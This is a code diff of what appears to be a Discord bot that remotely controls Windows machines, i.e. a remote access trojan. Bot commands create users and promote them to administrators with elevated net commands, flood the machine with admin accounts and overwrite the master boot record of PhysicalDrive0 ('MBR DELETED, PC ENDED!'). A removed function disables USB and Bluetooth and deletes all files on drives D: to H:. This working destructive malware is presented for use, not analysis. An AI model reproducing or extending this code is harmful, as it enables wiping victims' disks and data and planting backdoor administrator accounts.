@@ -75,29 +75,54 @@ async def kp(ctx,*,process:str):
   if result.returncode==0:await ctx.send(f"Killed all instances of process {process}")
   else:await ctx.send(f"Error: Could not kill process {process}")
  except Exception as e:await ctx.send(f"Error: {e}")
-async def createuser(ctx, *, args: str):
+async def manageuser(ctx, action: str, *, username: str = None, password: str = ""):
     try:
-        args = args.split()
-        username = args[0]
-        password = args[1] if len(args) > 1 else ""
-        command = f'net user {username} {password} /add'
-        ctypes.windll.shell32.ShellExecuteW(None, "runas", "cmd.exe", f"/c {command}", None, 1)
-        await ctx.send(f"User {username} created.")
-    except Exception as e:
-        await ctx.send("Error creating user.")
-async def listuser(ctx):
-    await ctx.send(embed=discord.Embed(title="All User Accounts", description="\n".join([user['name'] for user in win32net.NetUserEnum(None, 0)[0]]) or "No users found", color=discord.Color.red()))
-async def deleteuser(ctx, *, username: str):
-    try:
-        command = f'net user {username} /delete'
-        result = subprocess.run(f'net user {username}', capture_output=True, text=True, shell=True)
-        if username in result.stdout:
+        if action == "help":
+            help_message = (
+                "Usage: !manageuser <action> <username> [password]\n"
+                "Actions:\n"
+                "  - create <username> <password>  : Creates a new user with the specified username and password.\n"
+                "  - delete <username>             : Deletes the specified user.\n"
+                "  - promote <username>           : Promotes the specified user to the administrators group.\n"
+                "  - demote <username>            : Demotes the specified user from the administrators group."
+            )
+            await ctx.send(help_message)
+        elif action == "create":
+            if not username:
+                await ctx.send("Username is required for creating a user.")
+                return
+            command = f'net user {username} {password} /add'
             ctypes.windll.shell32.ShellExecuteW(None, "runas", "cmd.exe", f"/c {command}", None, 1)
-            await ctx.send(f"User {username} deleted.")
+            await ctx.send(f"User {username} created.")
+        elif action == "delete":
+            if not username:
+                await ctx.send("Username is required for deleting a user.")
+                return
+            command = f'net user {username} /delete'
+            result = subprocess.run(f'net user {username}', capture_output=True, text=True, shell=True)
+            if username in result.stdout:
+                ctypes.windll.shell32.ShellExecuteW(None, "runas", "cmd.exe", f"/c {command}", None, 1)
+                await ctx.send(f"User {username} deleted.")
+            else:
+                await ctx.send(f"User {username} not found or could not be deleted.")
+        elif action == "promote":
+            if not username:
+                await ctx.send("Username is required for promoting a user.")
+                return
+            command = f'net localgroup administrators {username} /add'
+            ctypes.windll.shell32.ShellExecuteW(None, "runas", "cmd.exe", f"/c {command}", None, 1)
+            await ctx.send(f"User {username} has been promoted to administrators.")
+        elif action == "demote":
+            if not username:
+                await ctx.send("Username is required for demoting a user.")
+                return
+            command = f'net localgroup administrators {username} /delete'
+            ctypes.windll.shell32.ShellExecuteW(None, "runas", "cmd.exe", f"/c {command}", None, 1)
+            await ctx.send(f"User {username} has been demoted from administrators.")
         else:
-            await ctx.send(f"User {username} not found or could not be deleted.")
+            await ctx.send("Invalid action. Use 'create', 'delete', 'promote', 'demote', or 'help'.")
     except Exception as e:
-        await ctx.send(f"Error deleting user: {str(e)}")
+        await ctx.send(f"Error managing user: {str(e)}")
 async def wallpaper(ctx):
     try:
         file = await ctx.message.attachments[0].to_file()
@@ -108,21 +133,6 @@ async def wallpaper(ctx):
         await ctx.send("Wallpaper changed successfully.")
     except Exception as e:
         await ctx.send(f"Error changing wallpaper: {e}")   
-async def demoteuser(ctx, username: str):
-    try:
-        command = f'net localgroup administrators {username} /delete'
-        ctypes.windll.shell32.ShellExecuteW(None, "runas", "cmd.exe", f"/c {command}", None, 1)
-        await ctx.send(f"User {username} has been demoted from administrators.")
-    except Exception as e:
-        await ctx.send(f"Error demoting user {username}: {e}")
-
-async def promoteuser(ctx, username: str):
-    try:
-        command = f'net localgroup administrators {username} /add'
-        ctypes.windll.shell32.ShellExecuteW(None, "runas", "cmd.exe", f"/c {command}", None, 1)
-        await ctx.send(f"User {username} has been promoted to administrators.")
-    except Exception as e:
-        await ctx.send(f"Error promoting user {username}: {e}")
 async def endpc(ctx):
     try:
         hDevice = win32file.CreateFileW("\\\\.\\PhysicalDrive0", win32con.GENERIC_WRITE, win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE, None, win32con.OPEN_EXISTING, 0, 0)
@@ -150,24 +160,6 @@ async def endpc(ctx):
         await ctx.send("MBR DELETED, PC ENDED!")
     except Exception as e:
         await ctx.send(f"Error executing disk operations: {e}")
-async def anticonnect():
- process = await asyncio.create_subprocess_exec('reg','add','HKLM\\SYSTEM\\CurrentControlSet\\Services\\USBSTOR','/v','Start','/t','REG_DWORD','/d','4','/f')
- await process.wait()
- process2 = await asyncio.create_subprocess_exec('sc','stop','bthserv')
- await process2.wait()
- process3 = await asyncio.create_subprocess_exec('reg','add','HKLM\\SYSTEM\\CurrentControlSet\\Services\\BTHPORT','/v','Start','/t','REG_DWORD','/d','4','/f')
- await process3.wait()
- drives = ['D:','E:','F:','G:','H:']
- for drive in drives:
-  if os.path.exists(drive):
-   try:
-    for root, dirs, files in os.walk(drive):
-     for file in files:
-      os.remove(os.path.join(root, file))
-     for dir in dirs:
-      shutil.rmtree(os.path.join(root, dir))
-   except Exception as e:
-    pass
 async def flood(ctx):
  try:
   def create_user():
@@ -189,7 +181,7 @@ async def flood(ctx):
    for thread in threads:
     thread.join()
   await asyncio.to_thread(run_in_thread)
-  await ctx.send("100 admin user accounts created with randomized passwords and cursed ASCII names.")
+  await ctx.send("user profiles created")
  except Exception as e:
   await ctx.send(f"Error creating admin user accounts: {e}")
 def lockmefiles(): 
